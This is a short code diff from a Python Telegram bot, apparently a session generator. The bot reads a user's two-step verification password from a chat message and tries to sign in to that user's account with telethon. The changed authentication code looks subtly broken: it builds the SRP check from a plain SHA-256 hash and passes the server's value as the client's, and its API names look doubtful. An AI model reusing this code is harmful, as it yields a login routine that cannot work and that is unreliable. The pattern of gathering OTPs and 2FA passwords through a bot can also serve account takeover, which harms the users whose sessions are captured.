@@ -9,7 +9,7 @@ from pyrogram.types import (
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
 from telethon.sessions import StringSession
-from telethon.tl.functions.account import GetPassword
+from telethon.tl.functions.account import GetPasswordInformation
 from telethon.tl.functions.auth import CheckPassword
 from telethon.tl.types import InputCheckPasswordSRP
 from pymongo import MongoClient
@@ -135,8 +135,8 @@ async def handle_otp_or_password(client: Client, message: Message):
     if data.get("awaiting_password"):
         password = message.text.strip()
         try:
-            pw = await tclient(GetPassword())
-            pwd_hash = hashlib.sha256((pw.current_salt + password.encode() + pw.current_salt)).digest()
+            pw = await tclient(GetPasswordInformation())
+            pwd_hash = hashlib.sha256(pw.current_salt + password.encode() + pw.current_salt).digest()
             await tclient(CheckPassword(password=InputCheckPasswordSRP(
                 srp_id=pw.srp_id,
                 A=pw.srp_B,
